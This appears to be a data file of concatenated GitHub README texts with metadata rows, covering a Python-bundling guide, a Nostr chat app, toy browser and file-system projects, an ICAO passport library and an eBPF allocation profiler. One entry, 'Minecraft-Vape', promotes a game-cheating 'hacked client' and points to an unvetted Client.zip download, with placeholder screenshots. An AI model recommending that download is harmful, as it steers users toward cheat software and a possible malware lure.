Although tedious, it is possible to use Superlinker to build a fully self-contained Python distribution without source modifications or, in fact, touching source at all. First, link the combination of the Python executable, its dependencies, and essential modules. Using Alpine Linux 3.20 as the base distribution, run:

```
# apk add python3
$ ./superlinker py.elf /usr/bin/python3.12 /usr/lib/libpython3.12.so.1.0 \
    /usr/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-musl.so \
    /usr/lib/python3.12/lib-dynload/binascii.cpython-312-x86_64-linux-musl.so \
    /usr/lib/python3.12/lib-dynload/zlib.cpython-312-x86_64-linux-musl.so \
    /usr/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-musl.so \
    /usr/lib/python3.12/lib-dynload/_struct.cpython-312-x86_64-linux-musl.so \
    /usr/lib/python3.12/lib-dynload/_ctypes.cpython-312-x86_64-linux-musl.so \
    /usr/lib/python3.12/lib-dynload/readline.cpython-312-x86_64-linux-musl.so \
    /usr/lib/libreadline.so.8 /usr/lib/libncursesw.so.6 /usr/lib/libffi.so.8 \
    /lib/libz.so.1 /lib/ld-musl-x86_64.so.1
```

Python has a little known function where it can [treat a zip archive as if it was a directory][zipimport], which will come in handy when packaging the (portable subset of) standard library modules:

```
# apk add fastjar
$ fastjar 0cvf py.zip -C /usr/lib/python3.12/ .
```

Note the `0` (that's a zero) option for `fastjar`; Python loads compressed zip archives using its own `zipimport` standard library module, which means that it cannot be compressed when it is a part of a zip archive itself.

Even though Python has all of these modules linked into it, it's currently unaware of that, and an attempt to import any of them will fail. This can be solved with a little bit of Python code:

```
$ cat >sitecustomize.py <<END
import sys, importlib.machinery, importlib.util

class SoulSearchingMetaPathFinder:
    @staticmethod
    def find_spec(name, path, target=None):
        if path is None:
            spec = importlib.util.spec_from_loader(name,
                importlib.machinery.ExtensionFileLoader(name, sys.executable))
            try:
                spec.loader.create_module(spec)
                return spec
            except ImportError:
                return None

sys.meta_path.append(SoulSearchingMetaPathFinder)
END
$ fastjar 0uvf py.zip sitecustomize.py
```

The Python executable and the Python standard library are now ready to spend an eternity together:

```
$ cat py.elf py.zip >py.run
$ chmod +x py.run
```

The final touch this distribution needs is the `PYTHONPATH` environment variable:

```
$ PYTHONPATH=$(pwd)/py.run ./py.run
Could not find platform independent libraries <prefix>
Could not find platform dependent libraries <exec_prefix>
Python 3.12.7 (main, Oct  7 2024, 11:30:19) [GCC 13.2.1 20240309] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import sys, zipfile
>>> print([zi.filename for zi in zipfile.ZipFile(sys.executable).filelist][:10])
['META-INF/', 'META-INF/MANIFEST.MF', './', '_collections_abc.py', 'socket.py', '__pycache__/', '__pycache__/heapq.cpython-312.pyc', '__pycache__/codecs.cpython-312.pyc', '__pycache__/shutil.cpython-312.pyc', '__pycache__/ssl.cpython-312.pyc']
>>> import zlib
>>> zlib.crc32(b""spam"")
1138425661
```

[zipimport]: https://docs.python.org/3/library/zipimport.html

## Past?

If you like Superlinker, you might also enjoy [unfork][].

[unfork]: https://github.com/whitequark/unfork

## License?

[0-clause BSD](LICENSE-0BSD.txt).
",0,0,1,0BSD,,4.0
erskingardner/whitenoise,master,"# White Noise

A secure, private, and decentralized chat app built on Nostr, using the MLS protocol under the hood.

## Overview

White Noise aims to be the most secure private chat app on Nostr, with a focus on privacy and security. Under the hood, it uses the [Messaging Layer Security](https://www.rfc-editor.org/rfc/rfc9420.html) (MLS) protocol to manage group communications in a highly secure way. Nostr is used as the transport protocol and as the framework for the ongoing conversation in each chat.

## The Spec

White Noise is an implemenetation of the [NIP-104](https://github.com/nostr-protocol/nips/pull/1427) spec. This is still a draft spec, so it may change before it is finalized.

## Running White Noise

White Noise is a Tauri app, so it can be run natively on Windows, MacOS, Linux, iOS, and Android. The app is still under heavily development so not all of these platforms are supported yet. Currently the easist (most reliable) way to run the app is on MacOS desktop via the `bun tauri dev`.

## Contributing

White Noise is built with Tauri 2 and SvelteKit. To get started contributing you'll need to have the Rust toolchain installed and the Bun JavaScript package manager.

1. Clone the repo.
2. Run `bun install` to install the dependencies.
3. Wait for Rust to install dependencies. 
4. Run `bun tauri dev` to start the app. If you want to see more comprehensive logging, run `RUST_LOG=debug bun tauri dev`.

## License

White Noise is free and open source software, released under the Gnu AGPL v3 license. See the [LICENSE](LICENSE) file for details.
",0,1,1,AGPL-3.0,,7.0
alpaylan/kale,main,"
# Kale

Kale is a toy browser written for the first ever Browser Jam. Here's a screenshot of it in action: 

![Kale Render](image.png)

There are lots of missing features, but it's a start!

## Running Kale

To run Kale, you'll need to have Rust installed. You can install it by following the instructions [here](https://www.rust-lang.org/tools/install).

After you have Rust installed, you can run Kale with the following command:

```bash
cargo run
```

This will build and run Kale. The default page is set to `pages/project2.html`, but you can change this by passing a different url as an argument to the `cargo run` command.

```bash
cargo run -- ""https://www.google.com""
```

This will open Google in Kale.

## Features

Kale is a very basic browser, and as such, it's missing a lot of features. It can render some simple HTML, but it doesn't support CSS or JavaScript. It supports clicking to links and scrolling, but nothing else.

",0,0,1,,,0.0
BacconKam/Minecraft-Vape,master,"# Minecraft-Vape

Welcome to the Minecraft-Vape repository! üéÆ

## Description

This repository hosts the latest version of Minecraft Vape, a powerful hacked client designed for enhancing your gameplay experience in Minecraft. Whether you are looking to gain an edge in PvP battles or automate tedious tasks, Minecraft Vape has got you covered.

## Features

- **ESP (Extrasensory Perception)**: Easily spot enemy players and mobs through walls, allowing you to stay ahead of the competition.
- **KillAura**: Automatically attacks nearby entities, giving you a significant advantage in combat situations.
- **Vape v4 Client**: The latest version of Vape client, packed with new features and improvements.
- **Wurst Integration**: Seamless integration with the Wurst client, expanding the range of tools at your disposal.

## Download

[![Download Minecraft Vape](https://img.shields.io/badge/Download-Client.zip-<COLOR_HEX_CODE>)](https://github.com/user-attachments/files/16830252/Client.zip)

Replace `<COLOR_HEX_CODE>` with the desired hexadecimal color code for the download button.

## Getting Started

To get started with Minecraft Vape, follow these steps:

1. Download the client using the download button above.
2. Install Minecraft Vape by following the installation instructions provided in the client package.
3. Launch Minecraft and enjoy the enhanced gameplay experience!

## Screenshots

Here are some screenshots of Minecraft Vape in action:

![Screenshot 1](https://example.com/screenshot1.png)

![Screenshot 2](https://example.com/screenshot2.png)

## Documentation

For detailed documentation on how to use Minecraft Vape and leverage its features to the fullest, refer to the [user manual](docs/manual.md).

## Contributions

Contributions to Minecraft Vape are welcome! If you have suggestions for new features or enhancements, feel free to submit a pull request.

## Support

If you encounter any issues while using Minecraft Vape or have any questions, please reach out to our support team at support@minecraftvape.com.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

Thank you for choosing Minecraft Vape for your hacked client needs! Happy gaming! üöÄüéâ

---

#### Keywords: minecraft, minecraft-client, minecraft-esp, minecraft-killaura, minecraft-vape, minecraft-mod, minecraft-vape-v4-download, minecraft-wurst, vape-hack-minecraft, vape-v4-client, vape-v4-hack, hacked-client, vape-v4, minecraft-bedrock, minecraft-bot, minecraft-clone, minecraft-launcher, minecraft-plugins, minecraft-script, vape",0,0,1,,,0.0
dvrkn/yabe,master,"
# YABE (YAml Base Extractor) - Multi-layer YAML organizer

The idea comes from the need to manage huge amount of YAML files in a GitOps environment. Especially when using ArgoCD multi-source apps with some common values and some overrides.
The tool helps to compute the common base configuration among multiple YAML files and generate differences for each file, reducing the duplication of configuration values. 
It also provides the ability to sort YAML content based on user-defined configuration.


## Features

- **Compute diffs:** Detect differences between YAML files.
- **Merge YAML files:** Combine YAML files with a base YAML, either from an existing file or dynamically computed.
- **Quorum-based diffing:** Extract common base YAML based on a quorum percentage.
- **Sort YAML content:** Sort keys in YAML files based on user-defined configuration.
- **Helm Values Integration:** Merge input YAML files with Helm values files.
- **In-place modification or output to new files.**

## Installation

```bash
cargo install yabe-gitops
```

## Usage

```bash
Usage: yabe [OPTIONS] <INPUT_FILES>...

Arguments:
  <INPUT_FILES>...  Input YAML files

Options:
  -r, --read-base <READ_BASE>                (Optional) Read-only base for values deduplication
  -b, --base <WRITE_BASE>                    (Optional) Common values of all input files, if not provided, will be computed
  -i, --in-place                             Modify the original input files with diffs
  -o, --out <OUT_FOLDER>                     Output folder for diff files [default: ./out]
      --debug                                Enable debug logging
  -q, --quorum <QUORUM>                      Quorum percentage (0-100) [default: 51]
      --base-out-path <BASE_OUT_PATH>        (Optional) Base file output path [default: ./base.yaml]
      --sort-config-path <SORT_CONFIG_PATH>  (Optional) Sort configuration file path [default: ./sort-config.yaml], if not provided, will not sort
  -h, --help                                 Print help
  -V, --version                              Print version
```


### Basic Usage

Run the tool with the YAML override files:

```bash
./yabe file1.yaml file2.yaml file3.yaml
```
This will compute the differences among the override files and generate:

* base.yaml: The common base configuration.
* file1_diff.yaml, file2_diff.yaml, file3_diff.yaml: The differences for each file.

### Inplace Modification

Use the -i or --inplace flag to modify the original override files with their differences:
```bash
./yabe -i -r helm_values.yaml file1.yaml file2.yaml file3.yaml
```

### Enable Debug Logging

Use the --debug flag to enable detailed debug logging:
```bash
./yabe --debug -r helm_values.yaml file1.yaml file2.yaml file3.yaml
```

## Examples

### Sample Input Files

_helm_values.yaml_
```yaml
settings:
  theme: dark
  notifications: true
  advanced:
    mode: auto
    level: 5
```

_file1.yaml_
```yaml
settings:
  theme: dark
  notifications: true
  advanced:
    mode: auto
    level: 5
```

_file2.yaml_
```yaml
settings:
  theme: light
  notifications: true
  advanced:
    mode: manual
    level: 5
```

_file3.yaml_
```yaml
settings:
  theme: dark
  notifications: false
  advanced:
    mode: auto
    level: 7
```

### Running the Tool
    
```bash
./yabe -r helm_values.yaml file1.yaml file2.yaml file3.yaml
```

### Expected Output
_base.yaml_
```yaml
settings:
  advanced:
    level: 5
```

_file1_diff.yaml_
(Empty file or not generated since there are no differences)

_file2_diff.yaml_
```yaml
settings:
  theme: light
  advanced:
    mode: manual
```

_file3_diff.yaml_
```yaml
settings:
  notifications: false
  advanced:
    level: 7
```

### Inplace Modification Example
Running with the -i flag:
```bash
./yabe -i -r helm_values.yaml file1.yaml file2.yaml file3.yaml
```

## Testing

The project includes a suite of tests to verify functionality. To run the tests:
```bash
cargo test
```
Ensure all tests pass to verify that the tool is functioning correctly.

### Project Structure
* _src/_
  * _lib.rs_: The library module containing core functionality.
  * _main.rs_: The main executable entry point.
  * _diff.rs_: Functions for computing diffs and common bases.
  * _deep_equal.rs_: Utility function for deep comparison of YAML values.
  * _sorter.rs_: Functions for sorting YAML content.
* _tests/_
  * _test_deep_equal.rs_: Tests for the deep_equal function.
  * _test_diff.rs_: Tests for compute_diff and diff_and_common_multiple functions.
  * _test_common.rs_: Common tests for the project.
  * _test_sorter.rs_: Tests for the sorter functions.
* _Cargo.toml_: Project configuration file.
* _sort-config.yaml_: Configuration file for sorting YAML content.
",0,3,2,MIT,ci.yaml,2.0
tzolov/spring-ai-cli-chatbot,main,"# Spring AI Chat Bot CLI

This Spring Boot, CLI, application demonstrates how to create an AI-powered chatbot with domain-specific knowledge (in this case, about Hurricane Milton) using Spring AI, Retrieval-Augmented Generation RAG and Conversational Memory.

Application uses the [Hurricane_Milton](https://en.wikipedia.org/wiki/Hurricane_Milton) wikipage saved as `wikipedia-hurricane-milton-page.pdf`.

## ChatBot Application

quick build run the app.
```
./mvnw clean install
./mvnw spring-boot:run
```

## Auto-configurations

### AI Model

By default, this project uses OpenAI's Spring Boot starter (`spring-ai-openai-spring-boot-starter`). 
However, you can easily switch to any other supported AI model.
The `pom.xml` file prvidew few alternative AI model dependencies. (Note: Most models, except Ollama/Llama3.2, require an API key for access.)
Configure your API key and other model properties in the `application.properties` file.
The [Chat Model API](https://docs.spring.io/spring-ai/reference/api/chatmodel.html) lists all supported modesl.

### Vector Store

The project is configured to use Chroma (`spring-ai-chroma-store-spring-boot-starter`) as a vector store, running locally:
A `docker-compose.yaml` file is provided to start a local Chroma instance.
The project is configured with Spring Boot Docker Compose integration for easy setup. (e.g. you don't have to start the docker-compose manually).
Find more about [Vector Stores](https://docs.spring.io/spring-ai/reference/api/vectordbs.html)

### PDF Document Processing

PDF document reading capability is enabled through the `spring-ai-pdf-document-reader` dependency.
Find more about the Spring AI [document indexing support](https://docs.spring.io/spring-ai/reference/api/etl-pipeline.html)

## CommandLineRunner

`CommandLineRunner` created by the `cli` Bean, is a Spring Boot interface for running code after the application context is loaded.
This is the entry point of our chatbot the application.

## Vector Store Loading

```java
vectorStore.add(new TokenTextSplitter().split(new PagePdfDocumentReader(hurricaneDocs).read()));
```

This line reads a PDF document about Hurricane Milton, splits it into tokens, and adds it to a vector store. This is part of the RAG setup, allowing the chatbot to retrieve relevant information.

## ChatClient Configuration

```java
var chatClient = chatClientBuilder
    .defaultSystem(""You are useful assistant, expert in hurricanes."")
    .defaultAdvisors(new MessageChatMemoryAdvisor(new InMemoryChatMemory()))
    .defaultAdvisors(new QuestionAnswerAdvisor(vectorStore))
    .build();
```

Here, a `ChatClient` is built with the following configurations:
- A system prompt defining the assistant's role
- A `MessageChatMemoryAdvisor` for maintaining conversation history
- A `QuestionAnswerAdvisor` that uses the vector store for RAG capabilities

## Chat Loop

```java
try (Scanner scanner = new Scanner(System.in)) {
    while (true) {
        System.out.print(""\nUSER: "");
        System.out.println(""\nASSISTANT: "" + 
            chatClient.prompt(scanner.nextLine())
                .call()
                .content());
    }
}
```

This creates an infinite loop that:
1. Prompts the user for input
2. Sends the user's input to the chatbot
3. Prints the chatbot's response

The chatbot uses the configured `ChatClient`, which incorporates the conversation history and RAG capabilities to generate responses.

## Key Features

1. **RAG Implementation**: The application uses a vector store to implement RAG, allowing the chatbot to retrieve relevant information from the loaded document.
2. **Conversation Memory**: The `MessageChatMemoryAdvisor` enables the chatbot to remember previous interactions within the conversation.
3. **PDF Document Processing**: The application can read and process PDF documents, making the information available to the chatbot.
4. **Interactive Console Interface**: The application provides a simple console-based interface for interacting with the chatbot.
",0,0,1,,,0.0
recmo/icao-9303,main,"# ICAO 9303: Electronic Machine Readable Travel Documents

Implementation of the ICAO 9303 standard for electronic machine readable travel documents (eMRTD) in Rust. This covers the data structure, cryptographic operations, and communication protocols for eMRTDs.

## Status

This is a work in progress. The following features are implemented:

* ASN1 Data structure for eMRTD.
* Basic APDU communication with eMRTDs.
* Cryptographic operations for:
  * Secure Messaging
  * Basic Access Control
  * Chip Authentication
  * Data group hashes
* Proxmark3 USB support for interacting with eMRTDs.

Not implemented yet:
 * MRZ parsing
 * PACE
 * Document signature verification
 * Cetificate chain validation
 * Named parameters for cryptographic operations
 * Chained APDUs and responses

Not planned:
 * Terminal Authentication

## References

* ICAO 9303: Machine Readable Travel Documents.
  <https://www.icao.int/publications/pages/publication.aspx?docnum=9303>

General:

* ISO/IEC 7816-4: Integrated Circuit(s) Cards with Contacts.
* ISO/IEC 14443-3: Proximity Cards.
* ITU-T X.690: ASN.1 encoding rules.

Cryptography:

* RFC 5280
* RFC 5480
* RFC 5114
* RFC 5639
* RFC 5652
* ANSI X9.42: Public Key Cryptography for the Financial Services Industry: Agreement of Symmetric Keys Using Discrete Logarithm Cryptography.
* ANSI X9.62: Public Key Cryptography for the Financial Services Industry: The Elliptic Curve Digital Signature Algorithm (ECDSA).
* FIPS 46-3: Data Encryption Standard (DES).
* BSI TR-03105: Advanced Security Mechanisms for Machine Readable Travel Documents.
* BSI TR-03110: Biometrics in Machine Readable Travel Documents.
* BSI TR-03111: Security Mechanisms for Electronic Passports.

CBC mode for block ciphers:

* ISO/IEC 10116-2006. Information technology ‚Äì Security techniques ‚Äì Modes of operation
for an n-bit block cipher, 2006.

CMAC mode for block ciphers:

* NIST SP 800-38B: Recommendation for Block Cipher Modes of Operation: The CMAC Mode for Authentication. <https://csrc.nist.gov/pubs/sp/800/38/b/final>

Physical layer:

* ECMA 340: Near Field Communication Interface and Protocol 1 (NFCIP-1)
* ECMA 352: Near Field Communication Interface and Protocol 2 (NFCIP-2)
* ISO/IEC 18000-3: Radio frequency identification for item management ‚Äî Part 3: Parameters for air interface communications at 13,56 MHz
",0,0,5,MIT,rust.yml,4.0
esp32-open-mac/esp32-wifi-hal-rs,main,"# esp32-wifi-hal-rs
This repo contains an experimental port of esp32-open-mac to Rust, with embassy. It is not intended to replace the C version, but to explore, how this can be done in Rust idiomatically. We still rely on the proprietary blobs for initializing the RF frontend and some more minor initialization. 
## DISCLAIMER
This is experimental software. USE AT YOUR OWN RISK! We'll not take any liability for damage to the hardware. We do not condone the use of this for malicious purposes.
## Usage
The crate is a library and there are example binaries in `src/bin/`. The only public API is the `WiFi` struct, which provides all currently implemented functioniality. Currently the RX policy is fixed to three, which means only beacons will be received.
## Building
To set up a development environment follow the guide at https://docs.esp-rs.org/book/installation/index.html. Since this only works on the ESP32 right now, only the Xtensa section is of interest.
To try one of these examples:
1. Clone the repo
2. Connect the ESP32
3. `cd examples`
4. Run `cargo run -r --bin [EXAMPLE_NAME_GOES_HERE]`
## Technical Notes
The ESP32 WiFi peripheral has five TX slots, which we number 0-4. The MMIO addresses, where these are configured are in reverse order. This means, that slot zero starts at the HIGHEST address and slot four at the lowest. This numbering is also suggested by the TX status registers. We could in theory reverse this ordering to ascending addresses, this would however cause headaches with TX slot status handling, so we chose to stick with descending addresses. This is also the way the proprietary task handles this.

We have reason to believe, that slot four is in some way special, as the TX completion handler in the proprietary task masks away the bit corresponding to that slot (See `hal_mac_get_txq_state`). However, as our tests do not indicate any special behaviour, we just use it like a normal slot.

",0,1,1,,,0.0
watthedoodle/rdfs,main,"# RDFS

üîß Rust Distributed File System (RDFS) a toy implementation of the Google File System (GFS)

![alt Experimental](https://img.shields.io/badge/Type-Experimental-red.svg)
![alt Rust](https://img.shields.io/badge/Language-Rust-orange.svg)
![alt Binary](https://img.shields.io/badge/Binary-Polymorphic-green.svg)

```shell

‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà           ‚ñà‚ñà
‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà

 a toy distributed file system
```

## Intro

Reading the original paper [""The Google File System""](https://pdos.csail.mit.edu/6.824/papers/gfs.pdf)
was the inspiration for HDFS _(Hadoop Distributed File System)_ that later gave way to Amazon's ""S3"" which has
become almost the ""defacto"" standard. Distributed file systems are super interesting and this project is
an attempt to understand how distributed file systems work by building a toy version of the original GFS.

![img](GFS.png)

I really like that idea of creating a single ""polymorphic binary"" that can act as the following:

- Master node
- Worker node
- Client CLI

## Environment Variables

This binary assumes that the following environemnt variables are present in order to setup the
required global configuration:

| Name          | Example value                        | Description                                |
| ------------- | ------------------------------------ | ------------------------------------------ |
| RDFS_ENDPOINT | https://master-node-ip:8888          | where the master node can be reached       |
| RDFS_TOKEN    | 7687a5ac-ed5a-4d69-8cc3-f78c119b3219 | the security token needed for this cluster |

## Usage: WARNING unstable will probably change

```shell
rdfs 0.1.0
Wat The Doodle <watthedoodle@gmail.com>


‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà           ‚ñà‚ñà
‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà

 a toy distributed file system


Usage: rdfs [COMMAND]

Commands:
  list    List all remote files e.g rdfs list
  get     Get a remote file e.g rdfs get foo.txt
  add     Add a remote file e.g rdfs add foo.txt
  remove  Remove a remote file e.g rdfs remove foo.txt
  mode    Mode: run the binary in either as a ""Master"" or ""Worker"" node
  help    Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version

```

## Authentication

For all the HTTP calls we need to pass the token as a custom header value i.e. `x-rdfs-token`. This
will be checked using an authentication middleware in axum.

## Test Harness

Some of the local tests require us to call the worker or master http endpoints, we have a folder called `test-harness` that contains those tests. To run the test execute the following:

```shell
$ deno task test
```

## Simulating a cluster using docker

In order to test our distributed cluster, instead of spinning up lots of heavy Virtual Machines, instead we can ""simulate"" it using lightweight containers.

First we will need to build our container images via the following commnand:

```shell
$ docker compose build
```

This will take some time but eventually once it completes we should have a custom docker image, we can check by doing the following:

```shell
$ docker images

REPOSITORY                                             TAG                 IMAGE ID       CREATED          SIZE
rdfs                                                   latest              e9d6e2275c17   35 minutes ago   13.2MB
```

now we can spin up our inital ""cluster"" with only 1 master node and 1 worker node:

```shell
$ docker compose up -d

[+] Running 3/3
 ‚úî Network rdfs_default     Created                                                                                 0.1s
 ‚úî Container rdfs-master-1  Started                                                                                 0.4s
 ‚úî Container rdfs-worker-1  Started                                                                                 0.3s
```

Now we can _scale_ the number of worker node simply by using the `scale` command, for example if we wanted to scale up to have 3 worker nodes:

```shell
$ docker compose scale worker=3

[+] Running 3/3
 ‚úî Container rdfs-worker-1  Running                                                                                 0.0s
 ‚úî Container rdfs-worker-3  Started                                                                                 0.6s
 ‚úî Container rdfs-worker-2  Started                                                                                 0.3s
```

If we wish to check out the logs we can do this by using the container names e.g:

```shell
$ docker logs -f rdfs-master-1

‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà      ‚ñà‚ñà
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà           ‚ñà‚ñà
‚ñà‚ñà   ‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà      ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà

 a toy distributed file system

==> launching node in [master] mode on port 8888...
==> got a heartbeat from worker node -> ...172.18.0.3:43640
```

Finally we can ""tear down"" our cluster simply by doing the following:

```shell
$ docker compose down
[+] Running 5/5
 ‚úî Container rdfs-master-1  Removed                                                                                10.3s
 ‚úî Container rdfs-worker-1  Removed                                                                                10.3s
 ‚úî Container rdfs-worker-2  Removed                                                                                10.2s
 ‚úî Container rdfs-worker-3  Removed                                                                                10.3s
 ‚úî Network rdfs_default     Removed                                                                                 0.1s
```
",0,0,1,,,1.0
PixelSergey/meow,main,"# Meow

Print ASCII cats to your terminal!

This is a simple command-line tool to display cute little kitties :D

I love cats

## Building

1. Install Rust
1. Build and run with `cargo run` or `cargo run -- FLAGS`
1. Will also be available as a Debian/Nix package

## Usage

```
Usage: meow [OPTIONS]

Options:
  -c, --count <COUNT>  How many cats to print [default: 1]
  -l, --literally      Are you literally this cat?
  -h, --help           Print help
  -V, --version        Print version
```

",2,0,1,MIT,,0.0
0xdeafbeef/jeprofl,master,"# jeprofl

jeprofl is a memory allocation profiling tool that uses eBPF technology to
analyze jemalloc allocations in your program. It may work with other
allocators, but this has not been tested.

[![colorized flamegraph output](assets/flamegraph.png)](assets/flamegraph.svg)

It can be used with already running program without recompilation.
Overhead with 1000x sampling is 80 ns per call under 2.5M allocations / sec.
![bpftop.png](assets/bpftop.png)

## Features

- Attach to a specific process or program
- Support for various jemalloc allocation functions (malloc, calloc, realloc,
  etc.)
- Order results by allocation count or total memory traffic
- Set minimum and maximum allocation sizes to track
- Configurable event sampling
- Generate CSV output and flame graphs
- Tracks allocation histograms per stack trace (rounded to power of 2)

```
6ae5a0 - malloc
4e54b0 - uu_ls::enter_directory
4e54b0 - uu_ls::enter_directory
4e54b0 - uu_ls::enter_directory
4e54b0 - uu_ls::enter_directory
4db790 - uu_ls::list
23b070 - uu_ls::uumain
bb560  - coreutils::main
1c9e60 - std::sys::backtrace::__rust_begin_short_backtrace
bdf00  - main
2a010  - __libc_start_call_main
2a0c0  - __libc_start_main_alias_2
a7f00  - _start

-----------+-----------+------------+--------------------------------------------------
Size       | Count     | Percentage | Distribution
-----------+-----------+------------+--------------------------------------------------
1 B        |     16870 |      4.23% | #######
2 B        |     21716 |      5.44% | #########
4 B        |     38150 |      9.56% | ################
8 B        |    120776 |     30.27% | ##################################################
16 B       |    103586 |     25.97% | ###########################################
32 B       |     58988 |     14.79% | ########################
64 B       |      7444 |      1.87% | ###
128 B      |     14768 |      3.70% | ######
512 B      |     16638 |      4.17% | #######
Total allocations: 18.4 MiB in 398936 allocations
```

- Minimal overhead

## Limitations

- Only works with statically linked programs(for now). Can work with dynamically
  linked programs, but you should provide the path to the dylib.

## Prerequisites

1. Install bpf-linker: `cargo install bpf-linker`
2. Linux kernel with eBPF support
3. Root privileges (for attaching to processes)

## Usage

Options:

- `--pid <PID>`: Attach to a specific process ID
- `--function <FUNCTION>`: Specify the jemalloc function to trace (default:
  malloc)
- `--order-by <ORDER>`: Order results by 'count' or 'traffic' (default: traffic)
  Traffic is the total allocated size, count is the number of malloc calls.
- `--max-alloc-size <SIZE>`: Maximum allocation size to track
- `--min-alloc-size <SIZE>`: Minimum allocation size to track
- `--sample-every <N>`: Sample every Nth event
- `--skip-size <SIZE>`: Skip allocations with total allocated < SIZE bytes
- `--skip-count <COUNT>`: Skip stack traces with total allocations count < COUNT
- `--csv <PATH>`: Generate CSV output: pid, stack_id, total allocations in
  bytes, count, histogram
  ""stacktrace""
- `--flame <PATH>`: Generate flame graph

Example:

```bash
RUST_LOG=info cargo xtask run --release -- --program ~/dev/oss/coreutils/target/release/coreutils --order-by count --sample-every 100  --skip-count 100 --csv malocs.csv -f malloc --flame malocs.svg
```

This will profile malloc calls in ls program, order results by total allocated
count, generate a CSV output, and create a flame graph.

# How it works

Ebpf program is attached to malloc function in the target program.
For every nth call it tracks stacktrace and size of allocation and store it to
cpu-local hashmap.

Userspace program polls these maps and resolves stacktraces to symbols.
On ctrl+c signal it aggregates all data and prints it.

## Todo

- [x] Aggregate histogram in kernel space. For now, we're just dumping all the
  data to userspace, which gives 1us overhead per call which is unacceptable.
  Pure uprobe uses 20ns per call.
- [ ] Find which malloc is used (now we assume that target is statically linked)
- [ ] Add ratatui based TUI
- [x] Produce flamegraphs
- [x] Add docs and examples
- [ ] somehow proof to ebpf verifier that number [0,1] is valid index for
  function call. For now, it gives amazing errors like:

```
Error: the BPF_PROG_LOAD syscall failed. Verifier output: 0: R1=ctx() R10=fp0
0: (bf) r6 = r1                       ; R1=ctx() R6_w=ctx()
1: (b7) r1 = 4                        ; R1_w=4
2: (63) *(u32 *)(r10 -280) = r1       ; R1_w=4 R10=fp0 fp-280=????4
3: (bf) r2 = r10                      ; R2_w=fp0 R10=fp0
4: (07) r2 += -280                    ; R2_w=fp-280
5: (18) r1 = 0xffff9f84a9a0dc00       ; R1_w=map_ptr(map=CONFIG,ks=4,vs=8)
7: (85) call bpf_map_lookup_elem#1    ; R0_w=map_value_or_null(id=1,map=CONFIG,ks=4,vs=8)
8: (15) if r0 == 0x0 goto pc+152      ; R0_w=map_value(map=CONFIG,ks=4,vs=8)
9: (79) r2 = *(u64 *)(r0 +0)          ; R0=map_value(map=CONFIG,ks=4,vs=8) R2=scalar()
10: (65) if r2 s> 0x2 goto pc+7       ; R2=scalar(smax=2)
11: (b7) r1 = 112                     ; R1_w=112
12: (15) if r2 == 0x0 goto pc+16      ; R2=scalar(smax=2,umin=1)
13: (15) if r2 == 0x1 goto pc+12      ; R2=scalar(smax=2,umin=2)
14: (15) if r2 == 0x2 goto pc+1 16: R0=map_value(map=CONFIG,ks=4,vs=8) R1=112 R2=2 R6=ctx() R10=fp0 fp-280=????mmmm
16: (b7) r1 = 96                      ; R1_w=96
17: (05) goto pc+11
29: (bf) r2 = r6                      ; R2_w=ctx() R6=ctx()
30: (0f) r2 += r1                     ; R1_w=96 R2_w=ctx(off=96)
31: (79) r8 = *(u64 *)(r2 +0)
dereference of modified ctx ptr R2 off=96 disallowed
verification time 73 usec
stack depth 280+0
processed 22 insns (limit 1000000) max_states_per_insn 0 total_states 2 peak_states 2 mark_read 2
```

## License

Apache 2.0 or MIT

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.",0,0,1,Apache-2.0,,0.0
